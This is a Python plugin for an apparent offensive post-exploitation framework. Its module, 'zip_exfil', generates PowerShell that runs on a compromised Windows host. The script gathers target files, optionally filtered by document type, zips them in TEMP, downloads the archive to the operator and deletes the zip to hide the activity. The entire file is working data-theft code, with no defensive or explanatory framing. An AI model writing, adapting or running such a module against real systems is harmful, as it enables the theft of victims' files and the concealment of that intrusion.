"""exfiltration/zip_exfil — compress target folder and exfiltrate. MITRE T1560.001"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ZipExfil(BasePlugin):
    NAME        = "zip_exfil"
    DESCRIPTION = "Compress-Archive target to zip in TEMP, then download via ctx.download()."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1560.001"
    CATEGORY    = "exfiltration"
    schema      = ParamSchema().add(
        Param("src",        str,  required=True,  help="Source path or glob on target"),
        Param("dest",       str,  required=False, default="",
              help="Zip destination path (default: TEMP with random name)"),
        Param("filter",     str,  required=False, default="",
              help="File extension filter before zipping e.g. *.docx,*.xlsx"),
        Param("delete_zip", bool, required=False, default=True,
              help="Delete zip from target after download (default true)"),
    )

    @mitre("T1560.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        src        = params["src"]
        dest       = params.get("dest", "").strip()
        flt        = params.get("filter", "").strip()
        delete_zip = params.get("delete_zip", True)

        # If filter specified, stage filtered files first
        filter_block = ""
        if flt:
            exts = [e.strip().lstrip("*.") for e in flt.split(",")]
            ext_cond = " -or ".join(f'$_.Extension -eq ".{e}"' for e in exts)
            filter_block = (
                "$stageDir = \"$env:TEMP\\stage_$(Get-Random)\";"
                "New-Item -ItemType Directory -Path $stageDir -Force | Out-Null;"
                f"Get-ChildItem '{src}' -Recurse -File -EA SilentlyContinue |"
                f" Where-Object {{ {ext_cond} }} |"
                " ForEach-Object { Copy-Item $_.FullName $stageDir -EA SilentlyContinue };"
                "$srcToZip = $stageDir;"
            )
            cleanup_stage = "Remove-Item $stageDir -Recurse -Force -EA SilentlyContinue;"
        else:
            filter_block = f"$srcToZip = '{src}';"
            cleanup_stage = ""

        delete_block = "Remove-Item $zipPath -Force -EA SilentlyContinue; '[*] Zip deleted from target';" if delete_zip else ""

        ps = (
            filter_block
            + f"$zipPath = if ('{dest}') {{ '{dest}' }} else {{ \"$env:TEMP\\exfil_$(Get-Random).zip\" }};"
            "try {"
            "  Compress-Archive -Path $srcToZip -DestinationPath $zipPath -Force -EA Stop;"
            "  $sz = [Math]::Round((Get-Item $zipPath).Length / 1MB, 2);"
            "  Write-Output \"ZIP: $zipPath ($sz MB)\""
            "} catch { Write-Output \"[-] Compress failed: $_\"; exit };"
            + cleanup_stage
            + "Write-Output $zipPath"
        )
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])

        # Extract zip path from last line of output
        lines    = r["output"].strip().splitlines()
        zip_path = lines[-1].strip() if lines else ""
        if not zip_path or not zip_path.endswith(".zip"):
            return ModuleResult.err(f"Could not determine zip path from output:\n{r['output']}")

        dl = ctx.download(zip_path)
        if dl["status"] != "ok":
            return ModuleResult.err(dl.get("output", "Download failed"))

        if delete_zip:
            ctx.ps(f"Remove-Item '{zip_path}' -Force -EA SilentlyContinue")

        info = "\n".join(lines[:-1])
        return ModuleResult.ok(
            data=f"[+] Exfiltrated: {zip_path}\n{info}",
            loot_kind="file"
        )
